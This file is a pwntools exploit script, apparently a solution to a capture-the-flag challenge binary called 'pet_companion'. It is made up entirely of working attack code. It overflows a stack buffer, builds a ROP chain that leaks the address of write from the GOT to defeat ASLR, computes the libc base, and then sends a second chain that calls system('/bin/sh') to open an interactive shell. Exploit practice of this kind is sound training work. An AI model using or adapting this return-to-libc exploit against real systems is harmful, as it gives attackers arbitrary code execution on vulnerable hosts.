from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''
init-pwndbg
b *main+149
continue
'''.format(**locals())

exe = './pet_companion'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.terminal = 'kitty'

io = start()

offset = 72
libc = ELF("./glibc/libc.so.6", checksec=False)
pop_rdi = ROP(exe).find_gadget(["pop rdi", "ret"])[0]
pop_rsi = ROP(exe).find_gadget(["pop rsi"])[0]

payload = flat({offset : [
    pop_rdi,
    0x1,
    pop_rsi,
    elf.got.write,
    0x0, # pop r15 not needed
    elf.plt.write,
    elf.sym['main']
]})

io.sendlineafter(b"status: ", payload)

io.recvuntil(b"Configuring...\n")
io.recvline()

write_leak = unpack(io.recvline()[:8].ljust(8, b"\x00"))
log.info(f"GOT Write : {hex(write_leak)}")

libc.address = write_leak - libc.sym['write']
log.info(f"LIBC Base : {hex(libc.address)}")
log.info(f"System : {hex(libc.sym['system'])}")

payload = flat({
    offset: [
        pop_rdi,
        next(libc.search(b"/bin/sh")),
        libc.sym['system']
    ]
})

io.sendlineafter(b"status: ", payload)

io.interactive()
